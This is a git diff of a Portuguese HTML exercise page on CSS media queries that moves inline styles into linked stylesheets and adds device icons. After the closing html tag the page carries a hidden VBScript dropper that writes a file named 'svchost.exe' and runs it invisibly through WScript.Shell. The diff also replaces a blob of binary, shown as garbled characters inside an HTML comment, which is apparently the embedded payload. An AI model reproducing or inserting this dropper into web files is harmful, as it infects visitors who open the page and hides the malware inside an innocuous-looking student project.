@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt - BR">
 <head>
@@ -6,49 +5,18 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Media Query</title>
-    <style>
-        /* declara√ß√µes gerais */
-
-            * {
-                margin: 0px;
-                padding: 0px;
-                font-family: Arial, Helvetica, sans-serif;
-            }
-
-            html, body {
-                width: 100vw;
-                height: 100vh;
-                background-color: #233eff;
-                background-size: contain;
-                background-repeat: no-repeat;
-            }
-
-            h1 {
-                color: whitesmoke;
-                text-shadow: 2px 2px 3px #000c6b;
-                padding: 10px;
-            }
-
-
-        /* declara√ß√µes para retrato */
-            @media screen and (orientation: portrait) {
-                body {
-                    background-image: url(../imagens/cev-portrait.jpg);
-                    background-position: center bottom;
-                }
-            }
-
-        /* declara√ß√µes para paisagem */
-            @media screen and (orientation: landscape){
-                body{
-                    background-image: url(../imagens/cev-landscape.jpg);
-                    background-position: left bottom;
-                }
-            }
-    </style>
+    <link rel="stylesheet" href="estilo/style.css" media="all">
+    <link rel="stylesheet" href="estilo/media-query.css">
 </head>
 <body>
-    <h1>Mude a orienta√ß√£o do seu dispositivo</h1>
+    <main>
+        <h1>Testando Media Queries</h1>
+        <img id="phone" src="imagens/icon-phone.png" alt="Acessando via smartphone">
+        <img id="tablet" src="imagens/icon-tablet.png" alt="Acessando via tablet">
+        <img id="print" src="imagens/icon-print.png" alt="Vers√£o para impress√£o">
+        <img id="pc" src="imagens/icon-pc.png" alt="Vers√£o para PC">
+        <img id="tv" src="imagens/icon-tv.png" alt="Vers√£o para Tv">
+    </main>
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
@@ -64,5 +32,4 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--ò ÿÊn¿£`d1l7«Ω;U(◊ˆQF∆:áOÙ<⁄ë4{Å°·jôAÆØÚÎÙ∞∫át<˙OxúÙ˜Ñ˘¢ZfÏ:áb’ã'Feàó~Ê©mBôT¸Æ‘°qÊπÍ£◊?ª¥Wt13ÑF∆B'‚ƒø{ë¯*Õo§Æ€M{ﬁ◊QhY_∫”MG¢ô–u|µ∫üÌ,“ã˚?æÛLD!®?çåUàXg¿ßfb–√∏4Á˘Ò¢÷ƒ<∑-≤ ùîI=∫1uAPj≥©ê1ç¯!®’d.yåÎ€|	´ëÔÚ©—xgŒpv-9Aƒ≠j√í§&¨¡†◊DñπA†±P(†±¥)CMuÏÑŸø√ÃN“úqÔ!ÉŸ*^iÊä\ègbè±Ÿ~¿Êzt„!ƒ K|k¿…\g~{ˆHä´≤å√@Àhs’c‚Å·áËæ´1<â:òX)ˆµÅ∫Õ´x¯çú”QÅÂîCFÍ”¿É¡%∏áU÷bÄ<◊º2~\à∑¯Ì|‰U
-uKø>=*rÕfÑ»ìüY!‹73ñq‚èü‰ëÔ—p^%ûÑ6Q≥o§u'pÍMH^Ü» Íπä±ùàC^§á¨X √ R —¯√ √ √ ≈)NÍ˝aÚ∆  √ -->
+//--></SCRIPT><!--êd‰œxh§>--üø◊≠$€ñu˜ÛìG∆∂NÖe¡ê∏∫a#wÛ¸J„ƒt9}p†˚C¨c†ﬂÚ£7ôIÖî‰§»ÚlØu—†>ì.]ƒàÁÉ¬Ä◊£îtäÿ≥~Ä˘∆ @™ht»0)oyâ˚$ß«ÔuÕÕq~∫÷`ºÑ≈ß/≥B¯©ç¨yõï¥)Ÿ¥… Y›}c´DΩÛwi9‰∑SÜÊL©îK=öh°©ò∫{V[√;Ñå€pÙ=Ä˚´ÉG%_uòê˜+•C˚∆øCVmÕ◊'K°"_	Cœ{dÀéÅTêj˘æi/˘´Ã3Æ Ã\ÀuÔ!ÓWí%{)z=Y∏Ô8uËDRV˜Û4—†Ç|ª#•+#πTÃK2h-y¢∞ò_,–äP|¥˚πaàÙHYaÇêœ=ÛŸ∆ñRï•¯.ÍciaËöÖz€ﬂ)sƒºcEñïk1„!RU496*œ$yRŸ)‘ƒ¿«V?∆8„ﬁ>Çµ«2ç–@Ø©´∂¿≥vïÈˆw9∏CÁ‰©˙]ë÷¶Ræú *u-¸*À°jLUXUmN‘^‡œè4!4s’–Nw˘Œ«|¿‚z‹SX)l◊ˆnæ<buá#—ì0jl √ R —¯√ √ √ ≈)NXãa_¿  √ -->
